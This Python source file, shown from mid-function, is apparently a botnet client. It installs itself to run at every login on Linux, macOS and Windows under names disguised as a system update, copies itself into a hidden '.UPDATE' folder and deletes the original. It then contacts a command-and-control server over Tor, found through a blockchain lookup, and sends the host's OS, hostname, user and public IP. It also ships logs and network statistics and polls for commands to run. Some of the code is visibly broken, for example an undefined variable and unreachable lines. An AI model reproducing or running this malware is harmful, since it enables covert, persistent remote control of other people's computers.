        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        Name=SystemUpdate
        Comment=Auto-start script
        """)
        logger.debug("Persistence set up successfully on Linux.")
    elif system == "Darwin":  # macOS
        launch_agents = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agents, exist_ok=True)
        plist_path = os.path.join(launch_agents, "com.systemupdate.plist")
        with open(plist_path, "w") as f:
            f.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
      <string>python3</string>
      <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>""")
        logger.debug("Persistence set up successfully on macOS.")
    else:
        logger.debug(f"Persistence setup skipped for unsupported system: {system}")

logger = logging.getLogger(__name__)

# --- Windows Persistence ---
def setup_persistence_windows():
    import winreg
    logger = logging.getLogger(__name__)
    logger.info("Setting up persistence for ALL users...")

    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "UPDATE"
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Open HKLM with write access
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
        )
        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(os.path.dirname(exe_path), ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_exe_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(exe_path, copied_exe_path)

        # Verify the copy exists
        if os.path.exists(copied_exe_path):
            logger.info(f"Copied script verified: {copied_exe_path}")
            # Delete the original script
            os.remove(exe_path)
            logger.info(f"Original script deleted: {exe_path}")
            return copied_exe_path
        else:
            logger.error(f"Copy verification failed: {copied_exe_path}")

        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, copied_exe_path)
        winreg.CloseKey(reg_key)

        logger.info("Persistence setup completed for ALL users.")
    except PermissionError:
        logger.error("Administrator privileges are required to set persistence for all users.")
    except Exception as e:
        logger.error(f"Unexpected error setting up persistence for all users: {e}")

# --- Linux Persistence ---
def get_user_home():
    system = platform.system()
    if system == "Windows":
        # Windows user home
        import winreg
        user = os.environ.get('USERNAME') or getpass.getuser()
        return os.path.join("C:\\Users", user)
    else:
        # Linux/macOS user home
        import pwd
        user = os.environ.get('SUDO_USER') or getpass.getuser()
        return pwd.getpwnam(user).pw_dir

def is_hidden_copy():
    script_path = os.path.abspath(__file__)
    return ".UPDATE" in script_path
    print(script_path)

def setup_persistence_linux():
    logger.info("Setting up persistence on Linux...")
    try:
        user_home = get_user_home()
        startup_dir = os.path.join(user_home, ".config", "autostart")

        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
            os.chmod(startup_dir, 0o777)  # Ensure full access
            logger.info(f"Created startup directory: {startup_dir} with 777 permissions")

        script_path = os.path.abspath(__file__)
        desktop_entry_path = os.path.join(startup_dir, "UPDATE.desktop")
        desktop_entry = f"""
[Desktop Entry]
Type=Application
Exec={os.path.join(startup_dir, ".UPDATE", "update.py")}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=UPDATE
Comment=Start UPDATE at login
"""

        if not os.path.exists(desktop_entry_path):
            with open(desktop_entry_path, 'w') as f:
                f.write(desktop_entry)
            os.chmod(desktop_entry_path, 0o777)  # Set permissions
            logger.info(f"Created persistence file: {desktop_entry_path} with 777 permissions")

        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(startup_dir, ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_script_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(script_path, copied_script_path)

        # Verify the copy exists
        if os.path.exists(copied_script_path):
            logger.info(f"Copied script verified: {copied_script_path}")
            # Delete the original script
            os.remove(script_path)
            logger.info(f"Original script deleted: {script_path}")
            return copied_script_path
        else:
            logger.error(f"Copy verification failed: {copied_script_path}")

        logger.info("Persistence setup completed on Linux.")
    except Exception as e:
        logger.error(f"Failed to set up persistence on Linux: {e}")

def run_file(file_path):
    """
    Runs a file, detecting type and using the proper method.
    Supports: Python scripts (.py), executables (.exe, .bin, etc.), and general binaries.
    """
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File not found: {file_path}")

    _, ext = os.path.splitext(file_path)
    ext = ext.lower()

    if ext == ".py":
        # Run Python script with current interpreter
        subprocess.run([sys.executable, file_path])
    elif os.access(file_path, os.X_OK) or ext in {".exe", ".bin"}:
        # Executable or binary
        subprocess.run([file_path])
    else:
        # Attempt to execute anyway (Linux may allow scripts without extension)
        subprocess.run([file_path])


# --- Main Persistence Function ---
def setup_persistence():
    logger.info("Setting up persistence...")
    system = platform.system()

    file_path = None  # Initialize

    if system == "Windows":
        file_path = setup_persistence_windows()
    elif system in ("Linux", "Darwin"):  # Darwin covers macOS
        file_path = setup_persistence_linux()
    else:
        logger.warning(f"Unsupported OS for persistence: {system}")

    if file_path:
        run_file(file_path)
    else:
        logger.error("Persistence setup did not return a valid file path.")

current_path = os.path.abspath(__file__) if not getattr(sys, 'frozen', False) else sys.executable

# Directory containing the script/executable
current_dir = os.path.dirname(current_path)


logger = logging.getLogger('Bot')
import requests

def register_with_c2(ghost_comm_client, c2_server_url, use_client_fallback: bool = False):
    """
    Register this bot with the C2 server.

    By default this function POSTS over Tor (Socks5 proxy at 127.0.0.1:9050).
    Set use_client_fallback=True to attempt using a client's send method if present.
    """
    logger.info("Attempting to register bot with C2...")
    try:
        info = {
            "os": platform.system(),
            "hostname": platform.node(),
            "user": getpass.getuser(),
            "ip": public_ip(),
        }
        payload = {"type": "register", "info": info, "id": BOT_ID}
        registration_endpoint = f"http://{c2_server_url}/api/bot/register"
        logger.debug(f"Sending registration payload to {registration_endpoint}: {json.dumps(payload)}")

        response_bytes = None

        # Default behavior: perform HTTP POST through Tor SOCKS proxy
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        headers = {"Content-Type": "application/octet-stream"}  # server reads request.data and will decrypt
        # If your server expects JSON instead of encrypted bytes, change `data=` to `json=` here.
        try:
            resp = requests.post(
                registration_endpoint,
                data=json.dumps(payload).encode("utf-8"),
                headers=headers,
                proxies=proxies,
                timeout=30,
            )
            resp.raise_for_status()
            response_bytes = resp.content
            logger.debug(f"HTTP (Tor) registration response size: {len(response_bytes)} bytes")
        except Exception as e:
            logger.warning(f"Tor-proxied HTTP POST failed: {e}")
            response_bytes = None

        # Optional fallback: use ghost_comm_client if caller explicitly requests and client provides a method
        if response_bytes is None and use_client_fallback:
            if hasattr(ghost_comm_client, "send_data_through_distributed_proxy_chain"):
                try:
                    response_bytes = ghost_comm_client.send_data_through_distributed_proxy_chain(
                        json.dumps(payload).encode("utf-8")
                    )
                except Exception as e:
                    logger.warning(f"Client fallback send failed: {e}")
                    response_bytes = None
            elif hasattr(ghost_comm_client, "request_lock_cycle_payload"):
                try:
                    resp = ghost_comm_client.request_lock_cycle_payload()
                    if isinstance(resp, (dict, list)):
                        response_bytes = json.dumps(resp).encode("utf-8")
                    elif isinstance(resp, str):
                        response_bytes = resp.encode("utf-8")
                    else:
                        response_bytes = resp
                except Exception as e:
                    logger.warning(f"Client fallback request_lock_cycle_payload failed: {e}")
                    response_bytes = None

        if response_bytes is None:
            logger.error("Registration failed: no response from Tor POST and no client fallback succeeded.")
            return None

        # Parse response (server should return JSON)
        try:
            response_data = json.loads(response_bytes.decode("utf-8"))
        except Exception:
            logger.debug("Could not JSON-decode server response, falling back to raw string.")
            response_data = {"status": "error", "message": response_bytes.decode("utf-8", errors="replace")}

        logger.debug(f"Received registration response from {registration_endpoint}: {response_data}")
        if response_data.get("status") == "ok":
            registered_bot_id = response_data.get("bot_id") or BOT_ID
            logger.info(f"Successfully registered bot {registered_bot_id} with C2 server.")
            return registered_bot_id
        else:
            logger.error(f"Failed to register bot {BOT_ID} with C2: {response_data.get('message')}")
            return None

    except Exception as e:
        logger.exception(f"An unexpected error occurred during registration of bot {BOT_ID}. Error: {e}")
        return None

def public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()  # Raise an exception for HTTP errors
        return response.text
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to get public IP: {e}")
        return "Unknown"







import requests

class GhostCommClient:
    def __init__(self, name, email):
        self.name = name
        self.email = email
        self.primary_node_host = None
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def connect_to_primary_node(self):
        try:
            response = requests.get(f'http://{self.primary_node_host}', proxies=self.proxies)
            response.raise_for_status()
            return response.json()
            print(response)
        except requests.exceptions.RequestException as e:
            raise Exception(f"Failed to connect to primary node: {e}")

    def request_lock_cycle_payload(self):
        try:
            response = requests.post(f'http://{self.primary_node_host}', json={'name': self.name, 'email': self.email}, proxies=self.proxies)
            response.raise_for_status()
            return response.json()
            print(response)
        except requests.exceptions.RequestException as e:
            raise Exception(f"Failed to request lock-cycle payload: {e}")

if __name__ == '__main__':
    logger.info("Starting Tor Expert Bundle automation script...")

    logger.info(f"Bot script started")
    try:
        if not is_hidden_copy():
            # Setup persistence and run the copied file
            logger.info(f"Executing First Run From Directory: {current_dir}")
            copied_path = setup_persistence()  # ensure setup_persistence() returns the copied path
            if copied_path:
                run_file(copied_path)  # execute the hidden copy
            sys.exit(0)  # Exit the original script
        else:
            # Hidden copy: normal execution
            tor_exe_path = prepare_tor()
            start_tor(tor_path)
            make_persistent()
            logger.info("Tor initialised and running...REROUTING...")
            # Full absolute path to the current script/executable
            # Directory containing the script/executable

            print("Executing From Directory: ", current_dir)

            logger.info("Bot script started.")

            # --- Argument Parser ---
            parser = argparse.ArgumentParser(description='A bot that connects to a C2 server.')
            parser.add_argument('--output', default='output.txt', help='The name of the output file.')
            args = parser.parse_args()
            logger.debug(f"Arguments parsed: {args}")

            # --- Configuration ---
            def get_c2_address():
                logger.info("Attempting to determine C2 address via blockchain registry...")
                resolved = fetch_control_url_from_blockchain(logger)
                update_control_url(resolved)
                logger.info(f"Using control URL: {resolved}")
                return resolved

            C2_SERVER = get_c2_address()
            logger.debug(f"Initial control URL resolved to: {C2_SERVER}")
            BOT_ID = f"{platform.node()}-{os.getpid()}"
            ENCRYPTION_KEY = b'sixteen byte key'
            MODULES_DIR = 'MODULES'
            logger.debug(f"Bot ID set to: {BOT_ID}")
            logger.debug("Core configuration variables set.")

            # --- Ghost Comm Client ---
            ghost_comm_client: Optional[GhostCommClient] = None
            decrypted_payload: Optional[dict] = None

            while True:
                current_url = fetch_control_url_from_blockchain(logger)
                update_control_url(current_url)
                logger.info(f"Attempting Ghost Comm connection via {current_url}")

                client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
                client.primary_node_host = current_url

                try:


                    ghost_comm_client = client
                    C2_SERVER = current_url
                    logger.info("Successfully retrieved payload from Ghost Comm.")
                    break
                except Exception as exc:
                    logger.warning(f"Failed to connect to Ghost Comm: {exc}. Retrying in 5 seconds.")
                    try:
                        client.close_connection()
                    except Exception:
                        pass
                    time.sleep(5)


            if ghost_comm_client:
                try:
                    ghost_comm_client.close_connection()
                except Exception:
                    pass

            if decrypted_payload is None:
                decrypted_payload = {}

            # --- C2 Logging Handler ---
            class C2LogHandler(logging.Handler):
                def __init__(self, bot_id, ghost_comm_client):
                    super().__init__()
                    self.bot_id = bot_id
                    self.ghost_comm_client = ghost_comm_client

                def emit(self, record):
                    log_entry = self.format(record)
                    try:
                        payload = {'type': 'log', 'bot_id': self.bot_id, 'log_entry': log_entry}
                        self.ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                    except Exception:
                        # Can't log this error to C2, so just ignore it
                        pass

            def send_network_stats():
                while True:
                    try:
                        net_io = psutil.net_io_counters()
                        stats = {
                            'bytes_sent': net_io.bytes_sent,
                            'bytes_recv': net_io.bytes_recv
                        }
                        payload = {'type': 'net_stats', 'bot_id': BOT_ID, 'stats': stats}
                        ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                    except Exception as e:
                        logger.warning(f"Could not send network stats: {e}")
                    time.sleep(10)

            # --- Tor Connectivity Check ---
            def check_tor_connectivity():
                logger.info("Verifying Tor connectivity...")
                try:
                    logger.debug("Making request to https://check.torproject.org/api/ip via Tor proxy.")
                    response = requests.get("https://check.torproject.org/api/ip", proxies={'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}, timeout=120)
                    response.raise_for_status()
                    data = response.json()
                    logger.debug(f"Tor check response: {data}")
                    if data.get('IsTor'):
                        logger.info(f"Tor connectivity confirmed. External IP: {data.get('IP')}")
                        return True
                    else:
                        logger.warning(f"Connected, but not through Tor. IP: {data.get('IP')}")
                        return False
                except requests.exceptions.RequestException:
                    logger.exception("Tor connectivity check failed. Is the Tor service running on port 9050?")
                    return False
                except json.JSONDecodeError:
                    logger.exception("Failed to decode JSON response from Tor check.")
                    return False
                except Exception:
                    logger.exception("An unexpected error occurred during Tor connectivity check.")
                    return False

            def ping_c2(ghost_comm_client):
                while True:
                    try:
                        payload = {'type': 'ping', 'bot_id': BOT_ID}
                        response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                        response_data = json.loads(response.decode('utf-8'))
                        if response_data.get('status') == 'ok':
                            logger.info("Sent ping to C2.")
                        else:
                            logger.error(f"Failed to ping C2: {response_data.get('message')}")
                    except Exception as e:
                        logger.exception("An error occurred while sending ping to C2.")
                    time.sleep(10) # Ping every 10 seconds

            # Main loop
            while True:
                c2_log_handler = C2LogHandler(BOT_ID, ghost_comm_client)
                c2_log_handler.setLevel(logging.INFO)
                formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
                c2_log_handler.setFormatter(formatter)
                logging.getLogger().addHandler(c2_log_handler)

                logger.info("Bot main function started.")
                if not check_tor_connectivity():
                    logger.critical("Tor is not available... Awaiting C2 Startup...")
                    time.sleep(5)
                    continue

                # Register with C2
                bot_id = register_with_c2(ghost_comm_client, C2_SERVER)
                if not bot_id:
                    logger.error("Failed to register with C2. Retrying in 60 seconds...")
                    time.sleep(60)
                    continue

                BOT_ID = bot_id

                # Start network stats thread
                net_stats_thread = threading.Thread(target=send_network_stats, daemon=True)
                net_stats_thread.start()

                # Start ping thread
                ping_thread = threading.Thread(target=ping_c2, args=(ghost_comm_client,), daemon=True)
                ping_thread.start()

                logger.info("Polling C2 for commands (long poll)...")
                payload = {'type': 'poll', 'bot_id': BOT_ID}
                response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                response_data = json.loads(response.decode('utf-8'))

                if response_data.get('status') == 'ok' and response_data.get('output') == 'no commands':
                    logger.debug("No commands available from C2.")
                    time.sleep(5)
                    continue

                if response_data.get('status') == 'ok':
                    command_obj_str = response_data['output']
                    logger.info("Encrypted command received from C2.")
                    command_obj = json.loads(command_obj_str)

                    with open(args.output, 'a') as f:
                        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Received command: {command_obj_str}\n")

                    handle_command(command_obj)
                else:
                    logger.warning(f"C2 returned an error: {response_data.get('message')}")
                    time.sleep(10)

    except KeyboardInterrupt:
        logger.info("Script interrupted by user.")
    except Exception as e:
        logger.error(f"Unhandled exception in __main__: {e}", exc_info=True)
